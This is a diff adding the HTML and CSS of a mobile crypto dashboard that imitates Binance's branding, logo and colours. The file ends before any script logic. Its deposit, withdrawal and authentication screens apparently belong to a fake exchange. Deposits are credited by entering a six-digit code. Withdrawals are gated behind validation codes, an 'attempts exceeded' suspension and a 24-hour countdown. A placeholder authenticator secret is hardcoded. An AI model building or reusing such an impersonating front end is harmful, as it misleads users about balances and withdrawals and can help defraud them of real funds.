@@ -1,0 +1,2043 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
+    <title>Binance Web3 Wallet Dashboard</title>
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- TradingView Charting Library -->
+    <script src="https://s3.tradingview.com/tv.js"></script>
+    <!-- QR Code Library for Deposit Address -->
+    <!-- Note: Using a lightweight, widely available QR library -->
+    <script src="https://cdn.jsdelivr.net/npm/davidshimjs-qrcodejs@0.0.2/qrcode.min.js"></script>
+
+    <style>
+        /* Custom dark theme colors mimicking Binance Web3 */
+        :root {
+            --bg: #07070b;
+            --card: #0f0f14;
+            --surface: #17171d;
+            --muted: #9aa0a6;
+            --accent: #fcd535; /* Binance Yellow */
+            --accent-strong: #ffd43b;
+            --glass: rgba(255, 255, 255, 0.03);
+            --text: #e6e9eb;
+            --danger: #f6465d; /* Red for sell/down */
+            --success: #0ecb81; /* Green for buy/up */
+            font-family: 'Inter', ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+        }
+
+        /* Core Layout */
+    html, body {
+    height: 100%;
+    background-color: var(--bg);
+    color: var(--text);
+    margin: 0;
+    padding: 0;
+
+    /* Allow vertical scroll globally */
+    overflow-x: hidden;
+    overflow-y: hidden; /* The page areas will handle their own scroll */
+
+        }
+
+        .app-container {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            max-width: 600px; /* Max width for mobile-style app */
+            margin: 0 auto;
+            background-color: var(--surface);
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .page-content {
+            flex-grow: 1;
+            overflow-y: auto; /* Scrollable area for page content */
+            padding-bottom: 80px; /* Space for the fixed footer */
+            scrollbar-width: none; /* Hide scrollbar for Firefox */
+            -ms-overflow-style: none; /* Hide scrollbar for IE and Edge */
+        }
+
+        .page-content::-webkit-scrollbar {
+            display: none; /* Hide scrollbar for Chrome, Safari, and Opera */
+        }
+    .page {
+    width: 100%;
+    overflow-y: auto;
+    -webkit-overflow-scrolling: touch;
+
+    /* Fill viewport minus header and bottom nav */
+    height: calc(var(--vh, 1vh) * 100 - 60px - 70px);
+    padding-bottom: env(safe-area-inset-bottom);
+         }
+        
+        /* Binance-style components */
+        .btn-primary {
+            background-color: var(--accent);
+            color: var(--bg);
+            font-weight: 600;
+            border-radius: 8px;
+            padding: 10px 16px;
+            transition: all 0.2s;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -2px rgba(0, 0, 0, 0.1);
+        }
+        .btn-primary:hover {
+            background-color: var(--accent-strong);
+        }
+
+        .btn-secondary {
+            background-color: var(--surface);
+            color: var(--text);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 10px 16px;
+            transition: all 0.2s;
+        }
+        .btn-secondary:hover {
+            background-color: #24242d;
+        }
+
+        /* Footer Navigation Styling */
+        .footer-nav {
+            background-color: var(--card);
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 0 -4px 10px rgba(0, 0, 0, 0.5);
+            z-index: 50;
+        }
+        .nav-item {
+            color: var(--muted);
+            transition: color 0.2s;
+        }
+        .nav-item.active {
+            color: var(--accent);
+        }
+
+        /* Modal/Popup Styles */
+        .modal-backdrop {
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 100;
+        }
+        .modal-content {
+            background-color: var(--surface);
+            border-radius: 12px;
+        }
+        /* Top Banner Notification */
+        #dailyNotificationBanner {
+            background-color: rgba(253, 213, 53, 0.95);
+            color: #07070b;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease-in-out;
+            z-index: 90;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+
+        <!-- DAILY POP-UP NOTIFICATION BANNER -->
+        <div id="dailyNotificationBanner" class="hidden fixed top-0 w-full max-w-[600px] mx-auto p-3 text-sm flex items-center justify-between">
+            <p id="dailyNotificationMessage" class="truncate font-medium"></p>
+            <button onclick="hideDailyNotification()" class="p-1 rounded-full hover:bg-black/10 transition-colors">
+                <svg class="w-4 h-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                </svg>
+            </button>
+        </div>
+        
+          <!-- GLOBAL HEADER (Always visible) -->
+        <header id="header" class="sticky top-0 z-20 flex items-center justify-between p-4 lg:px-6 bg-surface border-b border-gray-800 glass-card rounded-xl">
+       <div class="flex items-center gap-3">
+       <img src="https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png" alt="Binance" class="w-10 h-10 rounded" />
+        <div>
+         <h1 id="pageTitle" class="text-xl font-bold text-text">Home</h1>
+           </div>
+       </div>
+    <!-- Header Panel Buttons -->
+            <div class="flex items-center space-x-3">
+                <button onclick="showPage('notification')" class="p-2 rounded-full hover:bg-card transition-colors">
+                    <svg class="w-6 h-6 text-muted" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" />
+                    </svg>
+                </button>
+                <button onclick="showPage('search')" class="p-2 rounded-full hover:bg-card transition-colors">
+                    <svg class="w-6 h-6 text-muted" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
+                    </svg>
+                </button>
+                <button onclick="showPage('chat')" class="p-2 rounded-full hover:bg-card transition-colors">
+                    <svg class="w-6 h-6 text-muted" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 4v-4z" />
+                    </svg>
+                </button>
+
+                <!-- Connect Wallet Button -->
+                <button id="connectWalletBtn" onclick="toggleWalletConnection()" class="text-sm px-3 py-1 rounded-full font-medium transition-all duration-300"></button>
+            </div>
+        </header>
+
+        <!-- PAGE CONTENT CONTAINER -->
+        <div id="pageContentContainer" class="page-content">
+
+                <!-- HOME PAGE -->
+            <div id="home" class="page p-4 space-y-6">
+                <!-- User ID and Balance -->
+                <div class="bg-card p-6 rounded-xl shadow-lg">
+                    <div class="flex items-center justify-between mb-3">
+                        <p class="text-sm text-muted">User Account ID</p>
+                        <p id="userIDDisplay" class="text-sm font-mono text-text"></p>
+                    </div>
+                    <p class="text-xl text-muted font-medium">Total Balance</p>
+                    <p id="totalBalanceDisplay" class="text-4xl font-extrabold flex items-end">
+                        <span class="text-text">$0.00</span>
+                        <span id="balanceChange" class="text-sm ml-2 text-success"></span>
+                    </p>
+
+                    <!-- Deposit/Withdraw Buttons -->
+                    <div class="flex space-x-3 mt-5">
+                        <button onclick="openDepositCoinSelection()" class="flex-1 btn-primary flex items-center justify-center space-x-2">
+                            <svg class="w-5 h-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
+                            </svg>
+                            <span>Deposit</span>
+                        </button>
+                        <button onclick="showWithdrawalSelector()" class="flex-1 btn-secondary flex items-center justify-center space-x-2">
+                            <svg class="w-5 h-5 text-text" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-3V7a4 4 0 00-8 0v3H5a2 2 0 00-2 2v5a2 2 0 002 2h14a2 2 0 002-2v-5a2 2 0 00-2-2h-2z" />
+                            </svg>
+                            <span>Withdraw</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Holdings Section -->
+                <div>
+                    <h2 class="text-lg font-semibold mb-3">Holdings</h2>
+                    <div id="holdingsList" class="space-y-3">
+                        <p class="text-muted text-sm text-center py-4">Connect wallet to see holdings.</p>
+                    </div>
+                </div>
+
+                <!-- Live Prices Performance Charts (TradingView) -->
+                <div>
+                    <h2 class="text-lg font-semibold mb-3">Live Price Performance (BTC/USDT)</h2>
+                    <div class="bg-card rounded-xl overflow-hidden p-0" style="height: 300px;">
+                        <div id="tvChartContainer" class="w-full h-full"></div>
+                    </div>
+                </div>
+
+                <!-- Hot Coins Section -->
+                <div>
+                    <h2 class="text-lg font-semibold mb-3">Hot Coins</h2>
+                    <div id="hotCoinsList" class="grid grid-cols-2 gap-4">
+                        <p class="col-span-2 text-muted text-sm text-center py-4">Loading hot coins...</p>
+                    </div>
+                </div>
+
+                <!-- Transactions & Activity section -->
+                <div>
+                    <h2 class="text-lg font-semibold mb-3">Transactions & Activity</h2>
+                    <div id="activitySection" class="bg-card p-4 rounded-xl space-y-3">
+                        <p class="text-sm text-muted text-center">No recent activity.</p>
+                    </div>
+                </div>
+            </div>
+
+        
+           <!-- MARKET PAGE -->
+            <div id="market" class="page p-4 space-y-6 hidden">
+                <div class="space-y-4">
+                    <div id="marketOverview" class="bg-card p-4 rounded-xl">
+                        <h2 class="text-lg font-semibold mb-2">Market Overview</h2>
+                        <div class="grid grid-cols-2 gap-3 text-sm">
+                            <p class="text-muted">Total Mkt Cap:</p><p class="font-semibold" id="mktCap">...</p>
+                            <p class="text-muted">24h Volume:</p><p class="font-semibold" id="mktVol">...</p>
+                        </div>
+                    </div>
+
+                    <div id="marketNews" class="bg-card p-4 rounded-xl">
+                        <h2 class="text-lg font-semibold mb-2">Market News & Launch Pool</h2>
+                        <div id="newsContent" class="space-y-2 text-sm text-muted">
+                            <p>Fetching latest news...</p>
+                        </div>
+                    </div>
+
+                    <div>
+                        <h2 class="text-lg font-semibold mb-3">Top Coins List</h2>
+                        <div id="topCoinsList" class="space-y-2">
+                            <p class="text-muted text-center py-4">Loading coins...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TRADE PAGE -->
+            <div id="trade" class="page p-0 space-y-4 hidden">
+                <div class="p-4 pt-2 bg-surface border-b border-gray-800">
+                    <div class="flex justify-between items-center">
+                        <h2 class="text-xl font-bold">BTC/USDT <span class="text-success text-sm">+2.14%</span></h2>
+                        <button class="text-yellow-400 text-sm">Change Pair</button>
+                    </div>
+                </div>
+                <div class="bg-card" style="height: 400px;">
+                    <div id="tradeChartContainer" class="w-full h-full"></div>
+                </div>
+                <!-- Simple Buy/Sell Interface -->
+                <div class="p-4 grid grid-cols-2 gap-3">
+                    <button class="bg-success text-white py-3 rounded-xl font-bold text-lg hover:opacity-90 transition-opacity">Buy</button>
+                    <button class="bg-danger text-white py-3 rounded-xl font-bold text-lg hover:opacity-90 transition-opacity">Sell</button>
+                </div>
+            </div>
+
+            <!-- ACCOUNT PAGE -->
+            <div id="account" class="page p-4 space-y-6 hidden">
+                <div class="bg-card p-6 rounded-xl shadow-lg space-y-2">
+                    <h2 class="text-xl font-bold mb-4">My Wallet</h2>
+                    <p class="text-sm text-muted">User Account ID:</p>
+                    <p id="accountUserID" class="text-lg font-mono text-text">---</p>
+                    <div class="h-px bg-gray-800 my-3"></div>
+                    <p class="text-sm text-muted">Connected Wallet Address:</p>
+                    <p id="accountWalletAddress" class="text-lg font-mono text-text break-words">---</p>
+                    <div class="h-px bg-gray-800 my-3"></div>
+                    <p class="text-sm text-muted">Connected Wallet Balance:</p>
+                    <p id="accountWalletBalance" class="text-lg font-bold text-text">---</p>
+                </div>
+
+                <button onclick="showPage('accountDetails')" class="w-full btn-secondary flex items-center justify-between">
+                    <span>Account Details Panel</span>
+                    <svg class="w-5 h-5 text-yellow-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
+                </button>
+                <button onclick="disconnectWallet()" class="w-full bg-danger/20 text-danger py-3 rounded-xl font-semibold hover:bg-danger/30 transition-colors">Disconnect Wallet</button>
+            </div>
+
+            <!-- DEPOSIT FLOW PAGES (Hidden by default) -->
+
+            <!-- DEPOSIT 1: Coin Selection -->
+            <div id="depositCoinSelectionPage" class="page p-4 space-y-4 hidden">
+                <h2 class="text-xl font-bold">Select Deposit Asset</h2>
+                <input type="text" id="depositSearch" placeholder="Search coin name or symbol" class="w-full p-3 rounded-lg bg-card border border-gray-700 focus:ring-yellow-500 focus:border-yellow-500 text-text">
+                <div id="depositCoinList" class="space-y-2">
+                    <!-- Coin list loaded here -->
+                </div>
+            </div>
+
+            <!-- DEPOSIT 2: Network Selection -->
+            <div id="depositNetworkPage" class="page p-4 space-y-4 hidden">
+                <h2 class="text-xl font-bold">Select Network for <span id="depositCoinName"></span></h2>
+                <div id="networkSelectionList" class="space-y-3">
+                    <!-- Network buttons loaded here -->
+                </div>
+            </div>
+
+            <!-- DEPOSIT 3: Address and QR Code -->
+            <div id="depositAddressPage" class="page p-4 space-y-4 hidden">
+                <div class="flex justify-between items-center mb-4">
+                    <h2 class="text-xl font-bold">Deposit to <span id="depositNetworkHeader"></span></h2>
+                    <button onclick="showPage('depositCoinSelectionPage')" class="text-sm text-yellow-400 hover:opacity-80">Change Coin</button>
+                </div>
+
+                <div class="bg-card p-6 rounded-xl text-center space-y-4">
+                    <p class="text-sm text-muted">Scan the QR code or copy the address below to deposit.</p>
+                    <div id="qrcode" class="mx-auto bg-text p-3 rounded-lg w-fit"></div>
+                    <p class="text-xs text-danger font-semibold">Only send <span id="depositAddressCoinSymbol"></span> to this address.</p>
+                    <div class="bg-surface p-3 rounded-lg text-left break-words">
+                        <p class="text-sm text-muted mb-1">Deposit Address:</p>
+                        <p id="depositAddressDisplay" class="font-mono text-sm text-text">---</p>
+                    </div>
+                    <button onclick="copyDepositAddress()" class="w-full btn-secondary text-yellow-400 border-yellow-400/30">
+                        <svg class="w-5 h-5 inline-block mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v2" /></svg>
+                        Copy Address
+                    </button>
+                </div>
+            </div>
+
+            <!-- DEPOSIT 4: Confirmation (Simulated) -->
+            <div id="depositConfirmPage" class="page p-4 space-y-4 hidden">
+                <h2 class="text-xl font-bold">Deposit Confirmation</h2>
+                <div class="bg-card p-6 rounded-xl space-y-3">
+                    <p class="text-sm text-muted">Amount to Confirm:</p>
+                    <p class="text-2xl font-bold text-success">$<span id="depositConfirmAmount"></span> USD</p>
+                    <p class="text-sm text-muted pt-2">Enter the verification code from your device to confirm this deposit.</p>
+                    <input type="number" id="depositVerificationCode" placeholder="6-digit code (e.g., 123456)" class="w-full p-3 rounded-lg bg-surface border border-gray-700 focus:ring-yellow-500 focus:border-yellow-500 text-text">
+                    <p id="depositCodeError" class="text-danger text-sm hidden">Invalid or used verification code.</p>
+                    <button onclick="handleDepositConfirmation()" class="w-full btn-primary mt-4">Submit Deposit</button>
+                </div>
+            </div>
+
+            <!-- WITHDRAWAL FLOW PAGES (Hidden by default) -->
+
+            <!-- WITHDRAW 1: Selector (Modal content, shown via JS) -->
+            <div id="withdrawalSelector" class="fixed inset-0 modal-backdrop hidden flex items-end justify-center">
+                <div class="modal-content w-full max-w-[600px] p-4 space-y-4 transition-transform duration-300 transform translate-y-full">
+                    <h2 class="text-xl font-bold border-b border-gray-800 pb-3">Select Withdrawal Method</h2>
+                    <button onclick="showWithdrawalDetailsPage()" class="w-full btn-secondary flex items-center justify-between">
+                        <span>On-Chain Transfer (Wallet Address)</span>
+                        <svg class="w-5 h-5 text-yellow-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
+                    </button>
+                    <button onclick="showPage('account')" class="w-full btn-secondary flex items-center justify-between">
+                        <span>User Account ID (Internal Transfer)</span>
+                        <svg class="w-5 h-5 text-yellow-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
+                    </button>
+                    <button onclick="hideModal('withdrawalSelector')" class="w-full btn-secondary mt-4">Cancel</button>
+                </div>
+            </div>
+
+            <!-- WITHDRAW 2: Withdrawal Details -->
+            <div id="withdrawalDetailsPage" class="page p-4 space-y-4 hidden">
+                <h2 class="text-xl font-bold mb-4">Withdraw USDT (On-Chain)</h2>
+                <div class="space-y-4">
+                    <!-- Withdrawal Address -->
+                    <div class="relative">
+                        <label class="text-sm text-muted mb-1 block">Enter Withdrawal Address</label>
+                        <input type="text" id="withdrawalAddress" placeholder="0x..." class="w-full p-3 rounded-lg bg-card border border-gray-700 focus:ring-yellow-500 focus:border-yellow-500 text-text pr-32">
+                        <button onclick="fillFromConnectedWallet()" class="absolute right-2 top-8 text-yellow-400 text-xs font-semibold hover:opacity-80">Fill from connected wallet</button>
+                    </div>
+
+                    <!-- Network Selection -->
+                    <div class="relative">
+                        <label class="text-sm text-muted mb-1 block">Select Network</label>
+                        <select id="withdrawalNetwork" class="w-full p-3 rounded-lg bg-card border border-gray-700 focus:ring-yellow-500 focus:border-yellow-500 text-text appearance-none">
+                            <option value="" disabled selected>Select Network</option>
+                            <option value="Ethereum">ETC Ethereum Network</option>
+                            <option value="Bitcoin">BTC Bitcoin Network</option>
+                            <option value="BSC">BNB Smart Chain BEP20 Network</option>
+                            <option value="Tron">Tron TRC 20 Network</option>
+                        </select>
+                        <svg class="w-5 h-5 absolute right-3 top-9 text-muted pointer-events-none" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" /></svg>
+                    </div>
+
+                    <!-- Amount Input -->
+                    <div>
+                        <label class="text-sm text-muted mb-1 block">Enter Withdrawal Amount (USD)</label>
+                        <div class="relative">
+                            <input type="number" id="withdrawalAmount" placeholder="0.00" class="w-full p-3 rounded-lg bg-card border border-gray-700 focus:ring-yellow-500 focus:border-yellow-500 text-text pr-20">
+                            <button onclick="fillMaxAmount()" class="absolute right-0 top-0 h-full px-4 text-yellow-400 text-sm font-semibold hover:opacity-80">Max</button>
+                        </div>
+                    </div>
+
+                    <!-- Gas Fee -->
+                    <div class="flex justify-between text-sm pt-2">
+                        <p class="text-muted">Network Fee (Gas):</p>
+                        <p class="font-semibold text-text">0.1934 BNB</p>
+                    </div>
+
+                    <button onclick="showWithdrawalConfirmationPage()" id="withdrawBtn" class="w-full btn-primary mt-6">Withdraw</button>
+
+                    <!-- Withdrawal Suspension Warning -->
+                    <div id="suspensionWarning" class="bg-danger/20 text-danger p-3 rounded-lg text-sm hidden">
+                        <p>Withdrawal suspended. Attempts exceeded. Time remaining: <span id="suspensionCountdown"></span></p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- WITHDRAW 3: Withdrawal Confirmation (Code Input) -->
+            <div id="withdrawalConfirmationPage" class="page p-4 space-y-4 hidden">
+                <h2 class="text-xl font-bold mb-4">Confirm Withdrawal</h2>
+                <div class="bg-card p-6 rounded-xl space-y-3">
+                    <p class="text-sm text-muted">Enter validation code to confirm withdrawal of <span id="confirmAmount"></span> USD.</p>
+                    <input type="number" id="withdrawalValidationCode" placeholder="6-digit code (e.g., 483t21)" class="w-full p-3 rounded-lg bg-surface border border-gray-700 focus:ring-yellow-500 focus:border-yellow-500 text-text">
+                    <p id="withdrawalCodeError" class="text-danger text-sm hidden"></p>
+                    <button onclick="handleWithdrawalConfirmation()" class="w-full btn-primary mt-4">Submit</button>
+                </div>
+            </div>
+
+            <!-- WITHDRAW 4: Processing Page (Countdown) -->
+            <div id="withdrawalProcessingPage" class="page p-4 space-y-4 hidden">
+                <div class="text-center bg-card p-6 rounded-xl space-y-4">
+                    <svg class="w-16 h-16 text-yellow-400 mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                    <h2 class="text-2xl font-bold">Withdrawal Processing</h2>
+                    <p class="text-muted">Your transaction is being processed and will be confirmed in:</p>
+                    <p id="processingCountdown" class="text-4xl font-extrabold text-yellow-400">24:00:00</p>
+                    <div class="text-left pt-4 space-y-2 text-sm">
+                        <p><span class="text-muted">Address:</span> <span class="font-mono break-all" id="procAddress"></span></p>
+                        <p><span class="text-muted">Network:</span> <span id="procNetwork"></span></p>
+                        <p><span class="text-muted">Amount:</span> <span id="procAmount"></span></p>
+                    </div>
+                    <button onclick="showPage('home')" class="w-full btn-secondary mt-4">View Withdrawal Details</button>
+                </div>
+            </div>
+
+            <!-- NOTIFICATION PAGE -->
+            <div id="notification" class="page p-4 space-y-6 hidden">
+                <h2 class="text-2xl font-bold mb-4">Notifications</h2>
+
+                <div class="bg-card p-4 rounded-xl flex items-center justify-between">
+                    <span>Daily Market Updates</span>
+                    <label class="switch relative inline-block w-12 h-6">
+                        <input type="checkbox" id="notificationToggle" onchange="toggleNotifications(this.checked)" class="opacity-0 w-0 h-0">
+                        <span class="slider absolute cursor-pointer top-0 left-0 right-0 bottom-0 bg-gray-600 rounded-full transition-colors duration-300 before:absolute before:content-[''] before:h-5 before:w-5 before:left-0.5 before:bottom-0.5 before:bg-white before:rounded-full before:transition-transform before:duration-300"></span>
+                    </label>
+                </div>
+                <style>
+                    .switch input:checked + .slider { background-color: var(--accent); }
+                    .switch input:checked + .slider:before { transform: translateX(24px); }
+                </style>
+
+                <h3 class="text-lg font-semibold border-b border-gray-800 pb-2">Latest Alerts</h3>
+                <div id="notificationList" class="space-y-3">
+                    <p class="text-sm text-muted text-center">No recent alerts.</p>
+                </div>
+            </div>
+
+            <!-- SEARCH PAGE -->
+            <div id="search" class="page p-4 space-y-4 hidden">
+                <h2 class="text-2xl font-bold">Search</h2>
+                <input type="text" id="globalSearchInput" placeholder="Search markets, coins, news..." class="w-full p-3 rounded-lg bg-card border border-gray-700 focus:ring-yellow-500 focus:border-yellow-500 text-text">
+                <div id="searchResults" class="space-y-3">
+                    <p class="text-sm text-muted text-center py-4">Search for a coin (e.g., BTC, BNB) or market info.</p>
+                </div>
+            </div>
+
+            <!-- CHAT PAGE (Support Chat) -->
+            <div id="chat" class="page p-4 space-y-4 hidden">
+                <h2 class="text-2xl font-bold">Support Chat (Gemini Bot)</h2>
+                <div id="chatContainer" class="h-[500px] flex flex-col bg-card rounded-xl overflow-hidden">
+                    <div id="chatMessages" class="flex-1 p-4 overflow-y-auto space-y-4">
+                        <div class="flex justify-start">
+                            <div class="bg-yellow-400 text-black p-3 rounded-xl rounded-bl-none max-w-[80%] shadow-md">
+                                Hello! I'm your Binance Web3 Assistant. How can I help you today?
+                            </div>
+                        </div>
+                    </div>
+                    <div class="p-4 border-t border-gray-800 flex space-x-2">
+                        <input type="text" id="chatInput" placeholder="Type your question..." class="flex-1 p-3 rounded-lg bg-surface border border-gray-700 text-text">
+                        <button onclick="sendChatMessage()" class="btn-primary w-20">Send</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ACCOUNT DETAILS/SECURITY FLOW PAGES -->
+            <div id="accountDetails" class="page p-4 space-y-6 hidden">
+                <h2 class="text-2xl font-bold mb-4">Account Details</h2>
+                <div class="bg-card p-6 rounded-xl space-y-2">
+                    <p class="text-sm text-muted">User Account ID:</p>
+                    <p id="detailUserID" class="text-lg font-mono text-text">---</p>
+                    <div class="h-px bg-gray-800 my-3"></div>
+                    <p class="text-sm text-muted">Connected Wallet Address:</p>
+                    <p id="detailWalletAddress" class="text-lg font-mono text-text break-words">---</p>
+                    <div class="h-px bg-gray-800 my-3"></div>
+                    <p class="text-sm text-muted">Deposit Balance (USD):</p>
+                    <p id="detailWalletBalance" class="text-lg font-bold text-text">---</p>
+                </div>
+                <button onclick="showPage('googleAuthVerification')" class="w-full btn-primary flex items-center justify-between">
+                    <span>Secure Account (Google Auth Verification)</span>
+                    <svg class="w-5 h-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
+                </button>
+                <button onclick="showPage('account')" class="w-full btn-secondary">Back to Account</button>
+            </div>
+
+            <div id="googleAuthVerification" class="page p-4 space-y-6 hidden">
+                <h2 class="text-2xl font-bold mb-4">Google Authentication Verification</h2>
+                <div class="bg-card p-6 rounded-xl space-y-4 text-center">
+                    <p class="text-sm text-muted">User Account ID: <span id="authUserID" class="font-mono text-text">---</span></p>
+                    <p class="text-sm text-muted">Scan this QR code with your Google Authenticator app.</p>
+                    <!-- Simulated QR Code -->
+                    <div id="authQrCode" class="mx-auto bg-white p-3 rounded-lg w-fit">
+                        <img src="https://placehold.co/160x160/24242d/ffffff?text=QR+Code" alt="Simulated QR Code" class="w-40 h-40" />
+                    </div>
+                    <p class="text-sm text-muted">Or enter the Secret Key manually:</p>
+                    <p id="authSecretKey" class="bg-surface p-2 rounded-lg font-mono text-sm text-yellow-400 break-all">A1B2C3D4E5F6G7H8</p>
+
+                    <input type="number" id="authCodeInput" placeholder="Enter Google Authenticator 6-digit code" class="w-full p-3 rounded-lg bg-surface border border-gray-700 focus:ring-yellow-500 focus:border-yellow-500 text-text">
+                    <p id="authCodeError" class="text-danger text-sm hidden"></p>
+
+                    <button onclick="verifyGoogleAuthCode()" class="w-full btn-primary mt-4">Verify Code</button>
+                </div>
+            </div>
+
+            <!-- MODALS (GLOBAL) -->
+            <div id="globalModal" class="fixed inset-0 modal-backdrop hidden flex items-center justify-center p-4">
+                <div class="modal-content w-full max-w-sm p-6 space-y-4 text-center">
+                    <h3 id="modalTitle" class="text-xl font-bold">Modal Title</h3>
+                    <p id="modalMessage" class="text-sm text-muted">Modal Message</p>
+                    <button onclick="hideModal('globalModal')" class="w-full btn-primary">Close</button>
+                </div>
+            </div>
+
+            <div id="globalLoading" class="fixed inset-0 modal-backdrop hidden flex items-center justify-center p-4">
+                <div class="bg-surface p-6 rounded-xl text-center space-y-3 shadow-2xl">
+                    <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-yellow-400 mx-auto"></div>
+                    <p id="loadingMessage" class="text-lg font-semibold">Loading...</p>
+                </div>
+            </div>
+
+            <div id="dailyPopUpNotification" class="fixed inset-0 modal-backdrop hidden flex items-center justify-center p-4">
+                <div class="modal-content w-full max-w-sm p-6 space-y-4 text-center">
+                    <h3 id="dailyPopUpTitle" class="text-xl font-bold text-yellow-400"></h3>
+                    <p id="dailyPopUpBody" class="text-sm text-muted"></p>
+                    <button onclick="hideModal('dailyPopUpNotification')" class="w-full btn-secondary">Cancel</button>
+                    <button id="dailyPopUpAddTokenBtn" onclick="addSelectedTokenToHoldings()" class="w-full btn-primary hidden">Add Token</button>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- FOOTER NAVIGATION (Always visible) -->
+        <footer class="footer-nav fixed bottom-0 w-full max-w-[600px] h-16 flex justify-around items-center">
+            <button class="nav-item flex flex-col items-center p-2 active" data-page="home" onclick="showPage('home')">
+                <svg class="w-6 h-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7m-2 2v10a1 1 0 01-1 1h-3m-6 0h-3a1 1 0 01-1-1v-10" /></svg>
+                <span class="text-xs">Home</span>
+            </button>
+            <button class="nav-item flex flex-col items-center p-2" data-page="market" onclick="showPage('market')">
+                <svg class="w-6 h-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6" /></svg>
+                <span class="text-xs">Market</span>
+            </button>
+            <button class="nav-item flex flex-col items-center p-2" data-page="trade" onclick="showPage('trade')">
+                <svg class="w-6 h-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2z" /></svg>
+                <span class="text-xs">Trade</span>
+            </button>
+            <button class="nav-item flex flex-col items-center p-2" data-page="account" onclick="showPage('account')">
